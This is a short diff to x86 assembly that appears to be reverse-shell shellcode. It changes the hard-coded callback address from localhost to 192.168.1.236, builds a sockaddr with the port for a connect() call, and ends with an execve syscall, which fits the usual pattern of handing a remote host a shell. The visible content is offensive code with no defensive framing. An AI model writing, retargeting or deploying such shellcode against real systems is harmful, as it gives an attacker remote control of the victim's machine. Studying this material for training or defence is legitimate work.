@@ -49,10 +49,12 @@ _start:
     	;need to push values to the stack to satisfy the following:
     	;int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
     
-    	push word 0x0100007f ; Each byte represents 1.2.3.4
+
+	;192.168.1.236   .2.0
+	push dword 0xec01a8c0
+    	;push word 0x0100007f ; Each byte represents 1.2.3.4
 	push word 0x4d01
 	push word 0x2
-	
 	
 	;addrlen
 	mov ecx, esp ; Moving the stack pointer to ecx to point to sockaddr structure dynamically
@@ -107,7 +109,4 @@ _start:
 
     	mov al, 0xb   ; Moving 11 to eax for execve syscall
     	int 0x80      ; Interupt to call the syscall
-
-
-
 
